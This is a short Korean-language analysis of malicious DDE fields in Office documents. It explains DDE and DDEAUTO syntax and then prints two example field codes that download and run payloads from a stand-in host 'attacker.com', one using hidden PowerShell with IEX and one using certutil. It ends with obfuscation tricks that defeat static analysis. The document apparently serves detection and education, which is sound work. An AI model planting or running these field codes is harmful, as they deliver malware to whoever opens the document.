# 70730.3 악성 DDE 필드 구조 및 명령어 분석

## 1. DDE 필드 기본 문법
공격자는 주로 다음과 같은 형식을 사용합니다.

```text
{ DDE "App" "Topic" "Item" }
{ DDEAUTO "App" "Topic" "Item" }
```

## 2. 주요 악성 파라미터 분석

### 2.1 Application (App)
실행할 프로세스 이름을 지정합니다.
- `cmd.exe`: 명령 프롬프트 실행.
- `powershell`: 파워쉘 실행.
- `msexcel`, `winword`: 다른 Office 인스턴스 호출.

### 2.2 Topic
`App`이 실행될 때 전달될 인자 또는 경로입니다. 악성 코드에서는 주로 `System`을 사용하여 명령 실행 모드로 진입합니다.

### 2.3 Item
실제 실행될 쉘 명령어입니다.

## 3. 대표적인 악성 명령어 예시

### 3.1 PowerShell 다운로더형
```text
{ DDEAUTO "C:\\Windows\\System32\\cmd.exe" "/c powershell.exe -NoP -Sta -NonI -W Hidden IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" }
```
- `DDEAUTO`: 문서 오픈 시 자동 실행.
- `-W Hidden`: 윈도우 창을 숨김.
- `IEX`: 다운로드한 스크립트를 즉시 메모리에서 실행.

### 3.2 Certutil 활용형
```text
{ DDE "cmd" "/c certutil -urlcache -split -f http://attacker.com/malware.exe %temp%\\v.exe & %temp%\\v.exe" }
```
- `certutil`: Microsoft 인증서 도구를 악용하여 파일을 다운로드.

## 4. 구조적 변형
공격자는 필드 코드를 복잡하게 꼬아서 정적 분석을 방해합니다.
- **중첩 필드:** `{ DDE { IF 1 = 1 "cmd" "" } "/c ..." }`
- **화이트스페이스 삽입:** `{    DDEAUTO   "cmd" ... }`
- **인코딩 적용:** 명령어 부분을 Base64 등으로 인코딩하여 삽입.
